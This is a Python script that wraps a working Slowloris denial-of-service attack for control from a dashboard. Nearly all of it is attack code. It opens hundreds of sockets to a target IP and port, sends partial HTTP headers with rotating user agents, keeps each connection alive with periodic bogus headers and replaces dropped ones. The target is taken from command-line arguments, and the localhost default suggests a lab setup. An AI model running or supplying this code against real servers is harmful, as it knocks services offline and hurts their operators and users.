#!/usr/bin/env python3
"""
Attack Bridge Script
===================

This script bridges the original code.py Slowloris attack with the dashboard.
It removes the user input requirement and makes it controllable via the UI.
"""

import socket
import time
import threading
import random
import sys
import json
from datetime import datetime
import sys
import io
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

class DashboardSlowloris:
    def __init__(self, target_ip="localhost", target_port=8080, socket_count=400):
        self.target_ip = target_ip
        self.target_port = target_port
        self.socket_count = socket_count
        self.sockets = []
        self.active = False
        self.stats = {
            'connections_created': 0,
            'connections_active': 0,
            'connections_failed': 0,
            'headers_sent': 0,
            'start_time': None,
            'last_update': None
        }
        
        # User agents for variety
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36', 
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Chrome/91.0.4472.124 Safari/537.36',
            'Firefox/89.0',
            'Safari/14.1.1',
            'Slowloris/Dashboard'
        ]
    
    def log(self, message):
        """Log message with timestamp"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"[{timestamp}] {message}")
        sys.stdout.flush()
    
    def create_connection(self):
        """Create a single Slowloris connection"""
        try:
            # Create socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            
            # Connect to target
            s.connect((self.target_ip, self.target_port))
            
            # Send partial HTTP request (this is the key to Slowloris)
            request = f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n"
            s.send(request.encode("utf-8"))
            
            # Send partial headers
            s.send(f"User-Agent: {random.choice(self.user_agents)}\r\n".encode("utf-8"))
            s.send(b"Accept-language: en-US,en,q=0.5\r\n")
            
            self.stats['connections_created'] += 1
            return s
            
        except socket.error as e:
            self.stats['connections_failed'] += 1
            return None
    
    def send_keep_alive(self, sock):
        """Send keep-alive header to maintain connection"""
        try:
            # Send additional header to keep connection alive
            header = f"X-a: {random.randint(1, 5000)}\r\n"
            sock.send(header.encode("utf-8"))
            self.stats['headers_sent'] += 1
            return True
        except socket.error:
            return False
    
    def start_attack(self):
        """Start the Slowloris attack"""
        if self.active:
            self.log("Attack already running!")
            return
        
        self.active = True
        self.stats['start_time'] = datetime.now()
        
        self.log(f"🎯 Starting Slowloris attack on {self.target_ip}:{self.target_port}")
        self.log(f"📊 Target connections: {self.socket_count}")
        
        # Phase 1: Create initial connections
        self.log("📡 Phase 1: Creating initial connections...")
        for i in range(self.socket_count):
            if not self.active:
                break
                
            sock = self.create_connection()
            if sock:
                self.sockets.append(sock)
            
            # Progress updates
            if i % 50 == 0 and i > 0:
                active = len(self.sockets)
                success_rate = (active / (i + 1)) * 100
                self.log(f"   Progress: {i+1}/{self.socket_count} - Active: {active} ({success_rate:.1f}%)")
            
            time.sleep(0.01)  # Small delay to avoid overwhelming
        
        initial_count = len(self.sockets)
        self.log(f"✅ Initial phase complete: {initial_count}/{self.socket_count} connections established")
        
        if initial_count == 0:
            self.log("❌ No connections established. Attack failed.")
            self.active = False
            return
        
        # Phase 2: Maintain connections
        self.log("🔄 Phase 2: Maintaining connections and sending keep-alive headers...")
        cycle = 0
        
        while self.active:
            cycle += 1
            cycle_start = time.time()
            
            # Send keep-alive to all connections
            active_sockets = []
            for sock in self.sockets:
                if self.send_keep_alive(sock):
                    active_sockets.append(sock)
                else:
                    # Connection lost, close it
                    try:
                        sock.close()
                    except:
                        pass
            
            self.sockets = active_sockets
            self.stats['connections_active'] = len(self.sockets)
            
            # Replace lost connections
            needed = self.socket_count - len(self.sockets)
            if needed > 0:
                for _ in range(min(needed, 50)):  # Limit replacements per cycle
                    if not self.active:
                        break
                    sock = self.create_connection()
                    if sock:
                        self.sockets.append(sock)
            
            # Update stats
            self.stats['connections_active'] = len(self.sockets)
            self.stats['last_update'] = datetime.now()
            
            # Log progress every 5 cycles
            if cycle % 5 == 0:
                uptime = time.time() - self.stats['start_time'].timestamp()
                cycle_time = time.time() - cycle_start
                self.log(f"📈 Cycle {cycle}: {len(self.sockets)} active connections | "
                        f"Uptime: {uptime:.0f}s | Cycle: {cycle_time:.2f}s")
            
            # Sleep between cycles
            time.sleep(10)
    
    def stop_attack(self):
        """Stop the attack and cleanup"""
        if not self.active:
            return
        
        self.log("🛑 Stopping attack...")
        self.active = False
        
        # Close all connections
        closed = 0
        for sock in self.sockets:
            try:
                sock.close()
                closed += 1
            except:
                pass
        
        self.sockets.clear()
        
        if self.stats['start_time']:
            duration = time.time() - self.stats['start_time'].timestamp()
            self.log(f"📊 Attack Summary:")
            self.log(f"   Duration: {duration:.1f} seconds")
            self.log(f"   Connections created: {self.stats['connections_created']}")
            self.log(f"   Connections failed: {self.stats['connections_failed']}")
            self.log(f"   Headers sent: {self.stats['headers_sent']}")
            self.log(f"   Sockets closed: {closed}")
        
        self.log("✅ Attack stopped and cleanup complete")
    
    def get_stats(self):
        """Get current attack statistics"""
        return self.stats.copy()

def main():
    """Main function - runs the attack without user input"""
    # Default settings for dashboard integration
    target_ip = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
    socket_count = int(sys.argv[3]) if len(sys.argv) > 3 else 400
    
    # Create and start attack
    attack = DashboardSlowloris(target_ip, target_port, socket_count)
    
    try:
        attack.start_attack()
    except KeyboardInterrupt:
        attack.log("🛑 Attack interrupted by user")
    except Exception as e:
        attack.log(f"❌ Attack error: {e}")
    finally:
        attack.stop_attack()

if __name__ == "__main__":
    main() 